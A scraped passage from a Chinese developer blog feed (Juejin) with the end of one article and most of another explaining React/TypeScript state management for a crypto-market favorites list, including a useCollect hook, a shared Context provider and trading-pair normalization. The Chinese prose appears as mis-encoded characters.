<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5901e395d3c24649ad9cc425ed264015~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=JCmeY8wnXIH5Vi7Xt1jpPlFtyg4%3D" alt="image.png" loading="lazy"/>
è¿™æ ·æˆ‘ä»¬å°±å®Œæˆäº†å‰¯ä½œç”¨çš„æ‰§è¡Œ</p>
<h2 data-id="heading-4">æ€»ç»“</h2>
<p>æœ€åï¼ŒåŒé“¾è¡¨çš„ç»“æ„å›¾å¤§è‡´å¯ä»¥æŠ½è±¡ä¸º</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d141a79d91eb462388d176cab77321ff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=gzDjJVXBi1cmfcnig7CNT4wmLhA%3D" alt="image.png" loading="lazy"/></p>
<p>å¥½äº†ï¼Œä»Šå¤©çš„æºç æ‹†è§£å°±åˆ°è¿™é‡Œã€‚</p>
<p>åŸåˆ›ä¸æ˜“ï¼Œå¦‚æœå¯¹ä½ æœ‰å¸®åŠ©ï¼Œç‚¹ä¸ªå°èµã€å…³æ³¨~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¸‚åœºè¡Œæƒ…æ”¶è—åˆ—è¡¨è”åŠ¨çš„çŠ¶æ€ç®¡ç†]]></title>    <link>https://juejin.cn/post/7600868443832746003</link>    <guid>https://juejin.cn/post/7600868443832746003</guid>    <pubDate>2026-01-30T11:52:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600868443832746003" data-draft-id="7600692485947621385" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¸‚åœºè¡Œæƒ…æ”¶è—åˆ—è¡¨è”åŠ¨çš„çŠ¶æ€ç®¡ç†"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-30T11:52:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Naomi_"/> <meta itemprop="url" content="https://juejin.cn/user/2107109724924174"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¸‚åœºè¡Œæƒ…æ”¶è—åˆ—è¡¨è”åŠ¨çš„çŠ¶æ€ç®¡ç†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2107109724924174/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Naomi_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T11:52:25.000Z" title="Fri Jan 30 2026 11:52:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">ä¸€ã€æ¶æ„è®¾è®¡ä¸æŠ€æœ¯é€‰å‹</h3>
<h4 data-id="heading-1">1.1 Markets æ¨¡å—æ ¸å¿ƒæ¶æ„</h4>
<h5 data-id="heading-2">è‡ªå®šä¹‰ Hook: useCollectï¼ˆæ ¸å¿ƒçŠ¶æ€ç®¡ç†ï¼‰</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// apps/my-page/hooks/use-collect.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">useCollect</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> [collectInfo, setCollectInfo] = useState&lt;<span class="hljs-title class_">CollectInfo</span>&gt;();
  <span class="hljs-keyword">const</span> [spotCollectState, setSpotCollectState] = useState&lt;<span class="hljs-built_in">string</span>[]&gt;([]);
  <span class="hljs-keyword">const</span> [contractCollectState, setContractCollectState] = useState&lt;<span class="hljs-built_in">string</span>[]&gt;([]);
  <span class="hljs-keyword">const</span> [pendingUnfavorites, setPendingUnfavorites] = useState&lt;<span class="hljs-title class_">Set</span>&lt;<span class="hljs-built_in">string</span>&gt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>());

  <span class="hljs-comment">// åˆå§‹åŒ–æ”¶è—æ•°æ®</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">initCollectInfo</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getCollectInfo</span>();
    <span class="hljs-keyword">if</span> (res.<span class="hljs-property">ret_code</span> === <span class="hljs-number">0</span>) {
      <span class="hljs-title function_">setCollectInfo</span>(res.<span class="hljs-property">result</span>.<span class="hljs-property">preferences</span>);
      <span class="hljs-title function_">setSpotCollectState</span>(res.<span class="hljs-property">result</span>.<span class="hljs-property">preferences</span>.<span class="hljs-property">spotBookSymbolSequence</span>?.<span class="hljs-title function_">split</span>(<span class="hljs-string">','</span>).<span class="hljs-title function_">filter</span>(<span class="hljs-title class_">Boolean</span>) || []);
      <span class="hljs-title function_">setContractCollectState</span>(res.<span class="hljs-property">result</span>.<span class="hljs-property">preferences</span>.<span class="hljs-property">bookSymbolSequence</span>?.<span class="hljs-title function_">split</span>(<span class="hljs-string">','</span>).<span class="hljs-title function_">filter</span>(<span class="hljs-title class_">Boolean</span>) || []);
    }
  };

  <span class="hljs-comment">// åˆ·æ–°æ”¶è—æ•°æ®ï¼ˆåˆ‡æ¢ Tab æ—¶è°ƒç”¨ï¼‰</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">refreshCollectInfo</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">initCollectInfo</span>();
    <span class="hljs-title function_">setPendingUnfavorites</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>());  <span class="hljs-comment">// æ¸…ç©ºå¾…ç§»é™¤åˆ—è¡¨</span>
  };

  <span class="hljs-comment">// ç‚¹å‡»æ”¶è—/å–æ¶ˆæ”¶è—</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">clickCollect</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">data: MarketData, marketType: <span class="hljs-string">'spot'</span> | <span class="hljs-string">'contract'</span></span>) =&gt; {
    <span class="hljs-keyword">if</span> (!data?.<span class="hljs-property">tradingPair</span>) <span class="hljs-keyword">return</span>;

    <span class="hljs-keyword">const</span> normalizedPair = <span class="hljs-title function_">normalizeTradingPair</span>(data.<span class="hljs-property">tradingPair</span>);  <span class="hljs-comment">// ç§»é™¤æ–œæ </span>
    <span class="hljs-keyword">const</span> currentList = marketType === <span class="hljs-string">'spot'</span> ? spotCollectState : contractCollectState;
    <span class="hljs-keyword">const</span> isCurrentlyCollected = currentList.<span class="hljs-title function_">includes</span>(normalizedPair);

    <span class="hljs-comment">// è®¡ç®—æ–°çš„æ”¶è—åˆ—è¡¨</span>
    <span class="hljs-keyword">const</span> newList = isCurrentlyCollected
      ? currentList.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item !== normalizedPair)
      : [...currentList, normalizedPair];

    <span class="hljs-comment">// ä¹è§‚æ›´æ–°æœ¬åœ°çŠ¶æ€ï¼ˆç«‹å³åé¦ˆç”¨æˆ·ï¼‰</span>
    <span class="hljs-keyword">if</span> (marketType === <span class="hljs-string">'spot'</span>) {
      <span class="hljs-title function_">setSpotCollectState</span>(newList);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-title function_">setContractCollectState</span>(newList);
    }

    <span class="hljs-comment">// å¼‚æ­¥åŒæ­¥åˆ°æœåŠ¡ç«¯</span>
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">updateCollectInfo</span>({
      <span class="hljs-attr">upsert_keys</span>: {
        <span class="hljs-attr">spotBookSymbolSequence</span>: marketType === <span class="hljs-string">'spot'</span> ? newList.<span class="hljs-title function_">join</span>(<span class="hljs-string">','</span>) : spotCollectState.<span class="hljs-title function_">join</span>(<span class="hljs-string">','</span>),
        <span class="hljs-attr">bookSymbolSequence</span>: marketType === <span class="hljs-string">'contract'</span> ? newList.<span class="hljs-title function_">join</span>(<span class="hljs-string">','</span>) : contractCollectState.<span class="hljs-title function_">join</span>(<span class="hljs-string">','</span>)
      }
    });

    <span class="hljs-comment">// åŸ‹ç‚¹è®°å½•</span>
    track?.(<span class="hljs-string">'MyPageClick'</span>, {
      <span class="hljs-attr">section_type</span>: <span class="hljs-string">'Markets'</span>,
      <span class="hljs-attr">button_name</span>: isCurrentlyCollected ? <span class="hljs-string">'Remove_from_Favorites'</span> : <span class="hljs-string">'Add_to_Favorites'</span>,
      <span class="hljs-attr">page_type</span>: <span class="hljs-string">'favorites_candidate'</span>,
      <span class="hljs-attr">page_name</span>: marketType
    });
  };

  <span class="hljs-keyword">return</span> {
    collectInfo,
    spotCollectState,
    contractCollectState,
    pendingUnfavorites,
    initCollectInfo,
    refreshCollectInfo,
    clickCollect,
    setPendingUnfavorites
  };
};
</code></pre>
<ul>
<li>åˆå§‹åŒ–çš„æ—¶å€™è°ƒç”¨APIå¾—åˆ°collectInfo,è®¾ç½®CollectStateçš„åˆå§‹çŠ¶æ€</li>
<li>ç”¨æˆ·æ·»åŠ æ”¶è—çš„æ—¶å€™,è°ƒç”¨æ¥å£,å†æ›´æ–°æœ¬åœ°çŠ¶æ€å’ŒcollectInfo</li>
<li>æ˜¾ç¤ºUIçš„æ—¶å€™,ä¼˜å…ˆæ˜¾ç¤ºæœ¬åœ°çŠ¶æ€,å¤‡ç”¨collectInfo</li>
<li><strong>å»¶è¿ŸåŒæ­¥æœºåˆ¶</strong>ï¼šé€šè¿‡ pendingUnfavorites å®ç°"ä¸ç«‹å³æ¶ˆå¤±"éœ€æ±‚</li>
<li><strong>çŠ¶æ€åˆ†ç¦»</strong>ï¼šSpot å’Œ Contract ç‹¬ç«‹ç®¡ç†ï¼Œé¿å…æ•°æ®æ··æ·†</li>
</ul>
<h4 data-id="heading-3">1.2 å¸‚åœºæ•°æ®å…±äº«ï¼ˆPC ç«¯ä½¿ç”¨ Contextï¼‰</h4>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// apps/my-page/contexts/MarketDataContext.tsx</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">MarketDataProvider</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span>&lt;{ <span class="hljs-attr">children</span>: <span class="hljs-title class_">ReactNode</span> }&gt; = <span class="hljs-function">(<span class="hljs-params">{ children }</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> marketData = <span class="hljs-title function_">useMarket</span>({
    <span class="hljs-attr">needSpot</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">needContract</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">defaultType</span>: <span class="hljs-string">'spot'</span>,
    <span class="hljs-attr">sortRule</span>: [
      { <span class="hljs-attr">label</span>: <span class="hljs-string">'hot'</span>, <span class="hljs-attr">tab</span>: <span class="hljs-string">'hot'</span> },
      { <span class="hljs-attr">label</span>: <span class="hljs-string">'newListing'</span>, <span class="hljs-attr">tab</span>: <span class="hljs-string">'newListing'</span> },
      <span class="hljs-comment">// ... å…¶ä»–æ’è¡Œæ¦œ</span>
    ]
  });

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">MarketDataContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{marketData}</span>&gt;</span>
      {children}
    <span class="hljs-tag">&lt;/<span class="hljs-name">MarketDataContext.Provider</span>&gt;</span></span>
  );
};

<span class="hljs-comment">// å­ç»„ä»¶ä½¿ç”¨</span>
<span class="hljs-keyword">const</span> { spot, contract, tabKey } = <span class="hljs-title function_">useMarketData</span>();
</code></pre>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>ä¸åœ¨é¡¶å±‚ä½¿ç”¨useMarket hookæ˜¯å› ä¸ºé¡¶å±‚çš„çˆ¶ç»„ä»¶ä¼šæ ¹æ®å¸‚åœºç§ç±»(spotæˆ–è¡ç”Ÿå“)å’Œtabçš„stateçš„å˜åŒ–è€Œé‡æ–°æ¸²æŸ“,å¦‚æœç»§ç»­ä½¿ç”¨hookä¼šå¯¼è‡´é‡å¤å‘é€è¯·æ±‚.ä½¿ç”¨contextå°±åªæ˜¯åœ¨Provideré‡Œè¯·æ±‚ä¸€æ¬¡</li>
<li>è§£å†³ Tab åˆ‡æ¢æ—¶ Spot/Contract æ•°æ®é”™ä¹±é—®é¢˜:</li>
</ul>
<p><strong>ç°è±¡ï¼š</strong></p>
<ul>
<li>åœ¨ Hot tab å¯ä»¥æ­£ç¡®æ˜¾ç¤º Spot æ•°æ®</li>
<li>åˆ‡æ¢åˆ° Favorites tab åï¼Œæ˜¾ç¤ºçš„æ˜¯ Contract æ•°æ®</li>
<li>å†åˆ‡å› Hot tabï¼Œæ•°æ®åˆå˜äº†</li>
</ul>
<p><strong>æ ¹å› åˆ†æï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// âŒ é”™è¯¯å®ç°ï¼šæ¯ä¸ª Tab ç‹¬ç«‹è°ƒç”¨ useMarket</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">HotTab</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> { spot } = <span class="hljs-title function_">useMarket</span>();  <span class="hljs-comment">// ç‹¬ç«‹å®ä¾‹</span>
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{spot.ranking.hot}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
};

<span class="hljs-keyword">const</span> <span class="hljs-title function_">FavoritesTab</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> { contract } = <span class="hljs-title function_">useMarket</span>();  <span class="hljs-comment">// å¦ä¸€ä¸ªç‹¬ç«‹å®ä¾‹</span>
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{contract.spotSymbolList}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
};
</code></pre>
<p>è§£å†³æ–¹æ¡ˆå°±æ˜¯ä¸Šè¿°çš„useContextæ•°æ®å…±äº«</p>
<h4 data-id="heading-4">1.3 äº¤æ˜“å¯¹æ ¼å¼æ ‡å‡†åŒ–</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ç§»é™¤æ–œæ ç»Ÿä¸€æ ¼å¼</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">normalizeTradingPair</span> = (<span class="hljs-params">pair: <span class="hljs-built_in">string</span></span>) =&gt; pair?.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\//g</span>, <span class="hljs-string">''</span>) || <span class="hljs-string">''</span>;

<span class="hljs-comment">// ç¤ºä¾‹</span>
<span class="hljs-string">'BTC/USDT'</span> =&gt; <span class="hljs-string">'BTCUSDT'</span>  <span class="hljs-comment">// å­˜å‚¨æ ¼å¼</span>
<span class="hljs-string">'BTCUSDT'</span> =&gt; <span class="hljs-string">'BTCUSDT'</span>   <span class="hljs-comment">// å·²æ ‡å‡†åŒ–æ ¼å¼</span>
</code></pre>
<p><strong>åŸå› ï¼š</strong></p>
<ul>
<li>ç°è´§å¸‚åœºè¿”å› BTC/USDTï¼Œåˆçº¦å¸‚åœºè¿”å› BTCUSDT</li>
<li>éœ€è¦ç»Ÿä¸€æ ¼å¼æ‰èƒ½æ­£ç¡®æ¯”è¾ƒå’Œå­˜å‚¨</li>
</ul>
<h3 data-id="heading-5">äºŒã€æ ¸å¿ƒåŠŸèƒ½å®ç°</h3>
<h4 data-id="heading-6">2.1 Favorites ç©ºçŠ¶æ€é»˜è®¤æ¨èhotæ¦œå•å‰ 6 æ¡æ•°æ®</h4>
<p><strong>ç»„ä»¶ç»“æ„ï¼š</strong></p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// apps/my-page/containers/newMyPage/Markets/NoFavorites/index.tsx</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">NoFavorites</span> = (<span class="hljs-params">{ marketType, onAddToFavorites }</span>) =&gt; {
  <span class="hljs-keyword">const</span> { spot, contract } = <span class="hljs-title function_">useMarketData</span>();
  <span class="hljs-keyword">const</span> [selectedItems, setSelectedItems] = useState&lt;<span class="hljs-title class_">Set</span>&lt;<span class="hljs-built_in">string</span>&gt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>());

  <span class="hljs-comment">// è·å– Hot æ¦œå•å‰ 6 æ¡æ•°æ®</span>
  <span class="hljs-keyword">const</span> hotData = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> data = marketType === <span class="hljs-string">'spot'</span> ? spot : contract;
    <span class="hljs-keyword">return</span> data?.<span class="hljs-property">ranking</span>?.<span class="hljs-property">hot</span>?.<span class="hljs-property">data</span>?.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">6</span>) || [];
  }, [spot, contract, marketType]);

  <span class="hljs-comment">// é»˜è®¤å…¨é€‰</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> allIds = hotData.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> <span class="hljs-title function_">normalizeTradingPair</span>(item.<span class="hljs-property">symbolName</span>));
    <span class="hljs-title function_">setSelectedItems</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(allIds));
  }, [hotData]);

  <span class="hljs-comment">// æ·»åŠ åˆ°æ”¶è—</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleAddToFavorites</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">const</span> selectedArray = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(selectedItems);
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">onAddToFavorites</span>(selectedArray);

    <span class="hljs-comment">// åŸ‹ç‚¹</span>
    track?.(<span class="hljs-string">'MyPageClick'</span>, {
      <span class="hljs-attr">page_type</span>: <span class="hljs-string">'favorites_candidate'</span>,
      <span class="hljs-attr">page_name</span>: marketType,
      <span class="hljs-attr">button_name</span>: <span class="hljs-string">'Add_to_Favorites'</span>
    });
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.noFavorites}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.grid}</span>&gt;</span>
        {hotData.map(item =&gt; (
          <span class="hljs-tag">&lt;<span class="hljs-name">NoFavoritesItem</span>
            <span class="hljs-attr">key</span>=<span class="hljs-string">{item.symbol}</span>
            <span class="hljs-attr">data</span>=<span class="hljs-string">{item}</span>
            <span class="hljs-attr">selected</span>=<span class="hljs-string">{selectedItems.has(normalizeTradingPair(item.symbolName))}</span>
            <span class="hljs-attr">onToggle</span>=<span class="hljs-string">{(id)</span> =&gt;</span> {
              const newSet = new Set(selectedItems);
              newSet.has(id) ? newSet.delete(id) : newSet.add(id);
              setSelectedItems(newSet);
            }}
          /&gt;
        ))}
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleAddToFavorites}</span>&gt;</span>
        Add to Favorites ({selectedItems.size})
      <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};
</code></pre>
<p><strong>Grid å¸ƒå±€æ ·å¼ï¼š</strong></p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// NoFavorites/index.module.less</span>
<span class="hljs-selector-class">.grid</span> {
  <span class="hljs-attribute">display</span>: grid;
  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(<span class="hljs-number">3</span>, <span class="hljs-number">1</span>fr);
  <span class="hljs-attribute">gap</span>: <span class="hljs-number">16px</span>;
  <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">24px</span>;

  <span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">768px</span>) {
    <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr;  <span class="hljs-comment">// H5 å•åˆ—</span>
    <span class="hljs-attribute">gap</span>: <span class="hljs-number">12px</span>;
  }
}
</code></pre>
<h4 data-id="heading-7">2.2 æ˜Ÿæ ‡äº¤äº’å®ç°</h4>
<p><strong>MarketDataTable ç»„ä»¶ï¼š</strong></p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// /Markets/MarketDataTable/index.tsx</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">MarketDataTable</span> = (<span class="hljs-params">{ marketType, tabValue }</span>) =&gt; {
  <span class="hljs-keyword">const</span> { spot, contract } = <span class="hljs-title function_">useMarketData</span>();
  <span class="hljs-keyword">const</span> { spotCollectState, contractCollectState, clickCollect } = <span class="hljs-title function_">useCollect</span>();

  <span class="hljs-comment">// è·å–å½“å‰å¸‚åœºçš„æ”¶è—åˆ—è¡¨</span>
  <span class="hljs-keyword">const</span> collectState = marketType === <span class="hljs-string">'spot'</span> ? spotCollectState : contractCollectState;

  <span class="hljs-comment">// è¿‡æ»¤æ•°æ®ï¼šfavorites tab åªæ˜¾ç¤ºæ”¶è—é¡¹</span>
  <span class="hljs-keyword">const</span> filteredList = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> data = marketType === <span class="hljs-string">'spot'</span> ? spot : contract;
    <span class="hljs-keyword">const</span> rawData = tabValue === <span class="hljs-string">'favorites'</span>
      ? (marketType === <span class="hljs-string">'spot'</span> ? data?.<span class="hljs-property">spotSymbolList</span> : data?.<span class="hljs-property">contractSymbolList</span>)
      : data?.<span class="hljs-property">ranking</span>?.[tabValue]?.<span class="hljs-property">data</span>;

    <span class="hljs-keyword">return</span> rawData?.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> ({
      <span class="hljs-attr">id</span>: item.<span class="hljs-property">symbol</span>,
      <span class="hljs-attr">tradingPair</span>: item.<span class="hljs-property">symbolName</span>,
      <span class="hljs-attr">price</span>: item.<span class="hljs-property">price</span>,
      <span class="hljs-attr">change24h</span>: <span class="hljs-title class_">Number</span>(item.<span class="hljs-property">change</span>),
      <span class="hljs-attr">volume24h</span>: item.<span class="hljs-property">turnover24hUSD</span>,
      <span class="hljs-attr">icon</span>: marketType === <span class="hljs-string">'spot'</span> ? item.<span class="hljs-property">icon</span> : item?.<span class="hljs-property">lightIcon</span>,
      <span class="hljs-attr">link</span>: item.<span class="hljs-property">link</span>,
